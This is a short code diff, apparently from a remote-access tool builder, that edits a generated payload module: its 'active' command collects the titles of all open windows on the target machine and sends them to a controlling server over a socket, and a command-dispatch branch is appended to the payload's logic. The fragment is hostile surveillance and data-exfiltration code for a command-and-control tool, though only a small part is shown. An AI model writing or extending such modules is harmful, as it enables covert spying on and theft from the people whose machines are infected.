@@ -32,7 +32,7 @@ def active():
     encoded = list(set(encoded))
     data = '[+]All opened windows : \\n'
     data += ''.join(encoded)
-    s.sendall((data + '\\n').encode())''')
+    main_send(data + "\\n", s)''')
         config.logics.append('''
             elif command == "active":
                 active()''')
